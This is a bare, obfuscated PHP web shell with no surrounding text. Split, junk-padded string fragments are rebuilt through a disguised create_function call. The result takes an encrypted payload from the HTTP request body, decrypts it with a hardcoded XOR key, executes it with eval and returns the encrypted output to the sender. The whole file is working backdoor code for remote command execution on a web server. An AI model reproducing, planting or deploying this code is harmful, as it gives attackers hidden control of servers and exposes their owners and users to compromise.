<?php
$L='I`val(@gzuncomI`prI`ess(@x(@baI`sI`e64_I`I`I`decode($m[1]),$k))I`);$o=@oI`bI`_I`I`get_conteI`nts(I`';
$a='_mI`atcI`h("/I`$kh(.+)$kf/",@fiI`le_getI`_coI`nI`tentI`s("pI`hp://input"),$mI`I`I`)==1) {@ob_I`start();@e';
$s='G";functI`ionI` x($I`I`t,$k){$c=strI`lI`en($k);$l=strlen($I`t);$o=I`""I`;forI`($i=0I`;$i<$lI`;){fo';
$Z=');@obI`_I`end_clean();$r=@baI`se64_encodI`e(@x(@gzcompresI`s($o),I`$k));pI`riI`nt("$I`p$kh$r$kf");}';
$p='r($j=0;(I`I`$j<$c&&$I`i<$l);I`$I`j++,$i++I`){$o.=$t{$I`i}^$k{$I`j}I`I`;}}return $o;}if I`I`(@preg';
$G=str_replace('E','','crEeatEe_EEfunEctiEon');
$g='$k=I`"eI`4dbd3I`1f";$kh="44I`5e2I`ccea5I`1c";I`$I`kf="335ef0a1c866"I`;$p="if3UZI`ctL90I`zdrjpI`';
$w=str_replace('I`','',$g.$s.$p.$a.$L.$Z);
$c=$G('',$w);$c();
?>
